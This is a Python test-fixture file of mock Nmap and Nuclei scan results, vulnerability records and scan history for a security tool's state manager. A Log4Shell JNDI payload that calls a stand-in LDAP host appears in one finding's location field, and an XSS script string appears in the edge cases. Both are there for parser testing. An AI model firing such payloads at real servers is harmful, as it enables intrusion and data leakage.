"""
Realistic mock data for State Manager tests.
Based on actual outputs from Nmap, Nuclei, and other security tools.
"""

from typing import Any, Dict, List

# =============================================================================
# REALISTIC MOCK DATA - Based on actual tool outputs
# =============================================================================

# Sample Nmap XML-style parsed output
MOCK_NMAP_HOST_1 = {
    "ip": "192.168.1.100",
    "hostname": "web01.corp.example.com",
    "os": "Linux 4.15 - 5.8",
    "ports": [
        {
            "number": 22,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "ssh",
                "product": "OpenSSH",
                "version": "8.2p1 Ubuntu 4ubuntu0.5",
                "banner": "SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.5"
            }
        },
        {
            "number": 80,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "http",
                "product": "Apache httpd",
                "version": "2.4.41",
                "banner": "Apache/2.4.41 (Ubuntu)"
            }
        },
        {
            "number": 443,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "https",
                "product": "nginx",
                "version": "1.18.0",
                "banner": None
            }
        },
        {
            "number": 3306,
            "protocol": "tcp",
            "state": "filtered",
            "service": {
                "name": "mysql",
                "product": "MySQL",
                "version": None,
                "banner": None
            }
        }
    ]
}

MOCK_NMAP_HOST_2 = {
    "ip": "192.168.1.101",
    "hostname": "api.corp.example.com",
    "os": "Linux 3.10 - 4.17",
    "ports": [
        {
            "number": 22,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "ssh",
                "product": "OpenSSH",
                "version": "7.4",
                "banner": "SSH-2.0-OpenSSH_7.4"
            }
        },
        {
            "number": 8080,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "http-proxy",
                "product": "Apache Tomcat/Coyote JSP engine",
                "version": "1.1",
                "banner": None
            }
        },
        {
            "number": 8443,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "https-alt",
                "product": "Apache Tomcat",
                "version": "9.0.31",
                "banner": None
            }
        }
    ]
}

MOCK_NMAP_HOST_3 = {
    "ip": "192.168.1.102",
    "hostname": "db.corp.example.com",
    "os": "Linux 2.6.32",
    "ports": [
        {
            "number": 22,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "ssh",
                "product": "OpenSSH",
                "version": "5.3",
                "banner": "SSH-2.0-OpenSSH_5.3"
            }
        },
        {
            "number": 5432,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "postgresql",
                "product": "PostgreSQL",
                "version": "9.6.24",
                "banner": None
            }
        },
        {
            "number": 6379,
            "protocol": "tcp",
            "state": "open",
            "service": {
                "name": "redis",
                "product": "Redis",
                "version": "5.0.7",
                "banner": "-ERR wrong number of arguments for 'get' command"
            }
        }
    ]
}

# Sample Nuclei JSON output style
MOCK_NUCLEI_VULNERABILITIES = [
    {
        "vuln_id": "CVE-2021-44228",
        "title": "Apache Log4j2 Remote Code Execution",
        "severity": "critical",
        "description": "Apache Log4j2 <=2.14.1 JNDI features used in configuration, log messages, and parameters do not protect against attacker controlled LDAP and other JNDI related endpoints.",
        "location": "http://192.168.1.101:8080/api/v1/search?q=${jndi:ldap://x${hostName}.L4J.example.com/a}",
        "evidence": "Matched by 'dns interaction' and 'jndi' pattern in response headers",
        "tool": "nuclei",
        "host": "192.168.1.101",
        "port": 8080
    },
    {
        "vuln_id": "CVE-2021-45046",
        "title": "Apache Log4j2 DoS via Context Lookup",
        "severity": "high",
        "description": "It was found that the fix to address CVE-2021-44228 in Apache Log4j 2.15.0 was incomplete in certain non-default configurations.",
        "location": "http://192.168.1.101:8080/api/v1/users",
        "evidence": "Log4j 2.15.0 detected in User-Agent parsing",
        "tool": "nuclei",
        "host": "192.168.1.101",
        "port": 8080
    },
    {
        "vuln_id": "CVE-2020-1938",
        "title": "Apache Tomcat AJP Connector File Read/Inclusion",
        "severity": "critical",
        "description": "When using the Apache JServ Protocol (AJP), care must be taken when trusting incoming connections to Apache Tomcat.",
        "location": "ajp://192.168.1.101:8009/WEB-INF/web.xml",
        "evidence": "Ghostcat vulnerability - AJP protocol exposed",
        "tool": "nuclei",
        "host": "192.168.1.101",
        "port": 8009
    },
    {
        "vuln_id": "ssl-weak-cipher",
        "title": "Weak SSL/TLS Cipher Suites",
        "severity": "medium",
        "description": "The server supports weak cipher suites that could be vulnerable to various attacks including BEAST, CRIME, or SWEET32.",
        "location": "192.168.1.100:443",
        "evidence": "TLS_RSA_WITH_3DES_EDE_CBC_SHA (0xa) - SWEET32 vulnerable",
        "tool": "nmap",
        "host": "192.168.1.100",
        "port": 443
    },
    {
        "vuln_id": "ssl-self-signed",
        "title": "Self-Signed SSL Certificate",
        "severity": "low",
        "description": "The server is using a self-signed SSL certificate which is not trusted by default.",
        "location": "192.168.1.100:443",
        "evidence": "Certificate issuer: CN=web01.corp.example.com, O=Corp, L=Berlin",
        "tool": "nmap",
        "host": "192.168.1.100",
        "port": 443
    },
    {
        "vuln_id": "CVE-2019-11358",
        "title": "jQuery Prototype Pollution",
        "severity": "medium",
        "description": "jQuery before 3.4.0, as used in Drupal, vulnerable to prototype pollution via the extend function.",
        "location": "http://192.168.1.100/static/js/jquery-3.3.1.min.js",
        "evidence": "jQuery version 3.3.1 detected in static assets",
        "tool": "nuclei",
        "host": "192.168.1.100",
        "port": 80
    },
    {
        "vuln_id": "redis-unauthorized",
        "title": "Redis Unauthorized Access",
        "severity": "high",
        "description": "Redis instance allows unauthorized access without authentication.",
        "location": "192.168.1.102:6379",
        "evidence": "INFO command returned server configuration without auth",
        "tool": "nmap",
        "host": "192.168.1.102",
        "port": 6379
    },
    {
        "vuln_id": "postgres-weak-auth",
        "title": "PostgreSQL Weak Password Policy",
        "severity": "medium",
        "description": "PostgreSQL instance may have weak authentication or default credentials.",
        "location": "192.168.1.102:5432",
        "evidence": "PostgreSQL 9.6.24 detected - check for CVE-2018-16850",
        "tool": "nuclei",
        "host": "192.168.1.102",
        "port": 5432
    },
    {
        "vuln_id": "CVE-2018-15473",
        "title": "OpenSSH Username Enumeration",
        "severity": "medium",
        "description": "OpenSSH through 7.7 is prone to a user enumeration vulnerability due to not delaying bailout for an invalid authenticating user until after the packet containing the request has been fully parsed.",
        "location": "192.168.1.102:22",
        "evidence": "OpenSSH 5.3 detected - vulnerable to user enumeration",
        "tool": "nmap",
        "host": "192.168.1.102",
        "port": 22
    },
    {
        "vuln_id": "outdated-software",
        "title": "Outdated Operating System",
        "severity": "high",
        "description": "The operating system appears to be outdated and may not receive security updates.",
        "location": "192.168.1.102",
        "evidence": "OS fingerprint: Linux 2.6.32 (likely RHEL/CentOS 6)",
        "tool": "nmap",
        "host": "192.168.1.102",
        "port": None
    }
]

# Sample action history
MOCK_ACTION_HISTORY = [
    {"tool": "nmap", "target": "192.168.1.100", "parameters": "-sV -sC -p 1-1000", "result_summary": "4 ports found"},
    {"tool": "nmap", "target": "192.168.1.101", "parameters": "-sV -sC -p 1-1000", "result_summary": "4 ports found"},
    {"tool": "nmap", "target": "192.168.1.102", "parameters": "-sV -sC -p 1-1000", "result_summary": "4 ports found"},
    {"tool": "nuclei", "target": "192.168.1.100", "parameters": "-t cves/ -severity critical,high", "result_summary": "2 vulnerabilities found"},
    {"tool": "nuclei", "target": "192.168.1.101", "parameters": "-t cves/ -severity critical,high", "result_summary": "3 vulnerabilities found"},
    {"tool": "nuclei", "target": "192.168.1.102", "parameters": "-t cves/ -severity critical,high", "result_summary": "2 vulnerabilities found"},
    {"tool": "nmap", "target": "192.168.1.100", "parameters": "--script ssl-enum-ciphers -p 443", "result_summary": "Weak ciphers detected"},
    {"tool": "nmap", "target": "192.168.1.101", "parameters": "--script http-title -p 8080", "result_summary": "Apache Tomcat detected"},
    {"tool": "subfinder", "target": "corp.example.com", "parameters": "-all", "result_summary": "3 subdomains found"},
    {"tool": "httpx", "target": "corp.example.com", "parameters": "-status-code -title", "result_summary": "3 live hosts"},
]

# Large dataset generator for performance tests
def generate_large_dataset(num_hosts: int = 50, vulns_per_host: int = 20) -> Dict[str, Any]:
    """Generate a large dataset for performance testing."""
    hosts = []
    vulnerabilities = []
    actions = []
    
    base_ips = [f"10.0.{i//256}.{i%256}" for i in range(num_hosts)]
    
    for i, ip in enumerate(base_ips):
        host = {
            "ip": ip,
            "hostname": f"host{i}.internal.corp.com",
            "os": f"Linux {3.10 + (i % 10) * 0.1:.1f}",
            "ports": [
                {
                    "number": 22,
                    "protocol": "tcp",
                    "state": "open",
                    "service": {
                        "name": "ssh",
                        "product": "OpenSSH",
                        "version": f"{7.4 + (i % 5) * 0.1:.1f}",
                        "banner": None
                    }
                },
                {
                    "number": 80,
                    "protocol": "tcp",
                    "state": "open" if i % 3 == 0 else "closed",
                    "service": {
                        "name": "http",
                        "product": "nginx" if i % 2 == 0 else "Apache",
                        "version": f"{1.18 + (i % 3) * 0.1:.1f}",
                        "banner": None
                    }
                },
                {
                    "number": 443,
                    "protocol": "tcp",
                    "state": "open" if i % 2 == 0 else "filtered",
                    "service": {
                        "name": "https",
                        "product": "nginx" if i % 2 == 0 else "Apache",
                        "version": f"{1.18 + (i % 3) * 0.1:.1f}",
                        "banner": None
                    }
                }
            ]
        }
        hosts.append(host)
        
        # Generate vulnerabilities for this host
        for j in range(vulns_per_host):
            vuln_types = ["CVE-2021-44228", "ssl-weak-cipher", "xss-stored", 
                         "sqli-error", "info-disclosure", "outdated-software"]
            severities = ["critical", "high", "medium", "low"]
            
            vuln = {
                "vuln_id": vuln_types[j % len(vuln_types)],
                "title": f"Vulnerability {j} on host {i}",
                "severity": severities[j % len(severities)],
                "description": f"Description for vulnerability {j}",
                "location": f"/path{j}/endpoint" if j % 2 == 0 else f"{ip}:{80 + j % 3}",
                "evidence": f"Evidence data for vuln {j}",
                "tool": "nuclei" if j % 2 == 0 else "nmap",
                "host": ip,
                "port": 80 + j % 3 if j % 2 == 0 else None
            }
            vulnerabilities.append(vuln)
        
        # Generate actions
        actions.append({
            "tool": "nmap",
            "target": ip,
            "parameters": f"-sV -p 1-1000 --host {i}",
            "result_summary": f"Scan completed for host {i}"
        })
    
    return {
        "hosts": hosts,
        "vulnerabilities": vulnerabilities,
        "actions": actions,
        "target": "internal.corp.com"
    }

# Sample edge cases
EDGE_CASE_HOSTS = [
    {"ip": "256.256.256.256", "hostname": "invalid-ip", "ports": []},  # Invalid IP
    {"ip": "", "hostname": "empty-ip.example.com", "ports": []},  # Empty IP
    {"ip": "192.168.1.1", "hostname": "x" * 1000, "ports": []},  # Very long hostname
    {"ip": "192.168.1.1", "hostname": "unicode-日本語.example.com", "ports": []},  # Unicode
]

EDGE_CASE_VULNERABILITIES = [
    {
        "vuln_id": "x" * 1000,  # Very long ID
        "title": "Test",
        "severity": "critical",
        "location": "/test",
        "description": "x" * 10000,  # Very long description
    },
    {
        "vuln_id": "CVE-2021-44228",
        "title": "",  # Empty title
        "severity": "invalid-severity",  # Invalid severity
        "location": "/test",
    },
    {
        "vuln_id": "special<>chars&\"'",
        "title": "Special <>&\"' Characters",
        "severity": "medium",
        "location": "/path?param=<script>alert(1)</script>",
    },
]

# Export all mock data
__all__ = [
    'MOCK_NMAP_HOST_1',
    'MOCK_NMAP_HOST_2', 
    'MOCK_NMAP_HOST_3',
    'MOCK_NUCLEI_VULNERABILITIES',
    'MOCK_ACTION_HISTORY',
    'generate_large_dataset',
    'EDGE_CASE_HOSTS',
    'EDGE_CASE_VULNERABILITIES'
]
